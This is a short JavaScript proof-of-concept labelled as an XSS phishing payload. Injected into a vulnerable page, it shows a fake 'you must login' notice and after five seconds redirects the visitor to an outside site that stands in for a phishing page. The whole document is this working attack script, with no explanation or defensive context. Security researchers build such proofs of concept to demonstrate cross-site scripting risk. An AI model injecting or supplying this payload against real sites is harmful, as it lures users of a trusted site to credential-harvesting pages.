<script type="text/javascript">
    // XSS phishing PoC

    document.write('To view this page, you must login. You will be redirected to the login page automatically in 5 seconds.');

    function phishing() {
        location.replace("http://adamziaja.com");
    }
    setTimeout("phishing();", 5000)
</script>
